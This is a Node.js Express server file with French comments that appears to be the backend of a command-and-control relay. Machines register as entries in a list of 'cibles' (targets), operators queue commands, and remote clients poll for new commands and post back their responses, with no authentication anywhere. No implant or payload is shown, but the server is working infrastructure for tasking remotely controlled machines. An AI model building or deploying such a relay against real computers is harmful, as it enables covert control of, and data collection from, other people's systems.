const express = require('express');
const pool = require('./database/db'); // Import the pool from db.js
const app = express();

app.use(express.json());

// Endpoint de base
app.get('/', (req, res) => {
    res.send({ message: 'Bridge Com !' });
});

// Récupération de la liste des cibles
app.get('/cibles', async (req, res) => {
    try {
        const result = await pool.query('SELECT computer_name FROM cibleList');
        res.json({ cibleList: result.rows.map(row => row.computer_name) });
    } catch (err) {
        console.error("Erreur lors de la récupération des cibles:", err);
        res.status(500).json({ message: "Erreur serveur" });
    }
});

// Ajout d'un nom d'ordinateur
app.post('/identify', async (req, res) => {
    const { computer_name = 'Unknown' } = req.body;
    try {
        await pool.query('INSERT INTO cibleList (computer_name) VALUES ($1)', [computer_name]);
        const result = await pool.query('SELECT computer_name FROM cibleList');
        res.json({ message: `Request from computer: ${computer_name}`, cibleList: result.rows.map(row => row.computer_name) });
    } catch (err) {
        console.error("Erreur lors de l'insertion du nom d'ordinateur:", err);
        res.status(500).json({ message: "Erreur serveur" });
    }
});

// Récupération de la liste des commandes
app.get('/commandes', async (req, res) => {
    try {
        const result = await pool.query('SELECT commande FROM commandes');
        res.json({ commandes: result.rows.map(row => row.commande) });
    } catch (err) {
        console.error("Erreur lors de la récupération des commandes:", err);
        res.status(500).json({ message: "Erreur serveur" });
    }
});

// Ajout d'une commande
app.post('/commande', async (req, res) => {
    const { commande } = req.body;
    if (!commande) {
        return res.status(400).json({ message: "Commande est requise." });
    }

    try {
        const { rows } = await pool.query('SELECT * FROM commandes WHERE commande LIKE $1', [`${commande.split('%')[0]}%`]);

        if (rows.length > 0) {
            await pool.query('UPDATE commandes SET commande = $1 WHERE id = $2', [commande, rows[0].id]);
        } else {
            await pool.query('INSERT INTO commandes (commande) VALUES ($1)', [commande]);
        }

        const result = await pool.query('SELECT commande FROM commandes');
        res.json({ message: `Commande ajoutée: ${commande}`, commandes: result.rows.map(row => row.commande) });
    } catch (err) {
        console.error("Erreur lors de l'ajout de la commande:", err);
        res.status(500).json({ message: "Erreur serveur" });
    }
});

// Récupération d'une commande
app.post('/getCommande', async (req, res) => {
    const { info } = req.body;
    try {
        const { rows } = await pool.query('SELECT commande FROM commandes WHERE commande LIKE $1', [`${info.split('%')[0]}%`]);

        const matchedCommande = rows.find(cmd => {
            const cmdParts = cmd.commande.split('%');
            const infoParts = info.split('%');
            return cmdParts[0] === infoParts[0] && (cmdParts[1] !== infoParts[1] || cmdParts[2] !== infoParts[2]);
        });

        if (matchedCommande) {
            res.json({ message: 'nouveau commande', commandes: matchedCommande.commande });
        } else {
            res.json({ message: 'Aucune nouveau commande' });
        }
    } catch (err) {
        console.error("Erreur lors de la récupération de la commande:", err);
        res.status(500).json({ message: "Erreur serveur" });
    }
});

// Ajout d'une reponse
app.post('/reponse', async (req, res) => {
    const { reponse } = req.body;
    if (!reponse) {
        return res.status(400).json({ message: "Reponse est requise." });
    }

    try {
        const { rows } = await pool.query('SELECT * FROM reponses WHERE reponse LIKE $1', [`${reponse.split('%')[0]}%`]);

        if (rows.length > 0) {
            await pool.query('UPDATE reponses SET reponse = $1 WHERE id = $2', [reponse, rows[0].id]);
        } else {
            await pool.query('INSERT INTO reponses (reponse) VALUES ($1)', [reponse]);
        }

        const result = await pool.query('SELECT reponse FROM reponses');
        res.json({ message: `Reponse ajoutée: ${reponse}`, reponses: result.rows.map(row => row.reponse) });
    } catch (err) {
        console.error("Erreur lors de l'ajout de la réponse:", err);
        res.status(500).json({ message: "Erreur serveur" });
    }
});

// Récupération d'une reponse
app.post('/getReponse', async (req, res) => {
    const { info } = req.body;
    try {
        const { rows } = await pool.query('SELECT reponse FROM reponses WHERE reponse LIKE $1', [`${info}%`]);

        if (rows.length > 0) {
            res.json({ message: 'reponse', reponse: rows[0].reponse });
        } else {
            res.json({ message: 'Aucune reponse' });
        }
    } catch (err) {
        console.error("Erreur lors de la récupération de la réponse:", err);
        res.status(500).json({ message: "Erreur serveur" });
    }
});

const PORT = 5000;
app.listen(PORT, () => console.log(`🚀 @ http://localhost:${PORT}`));
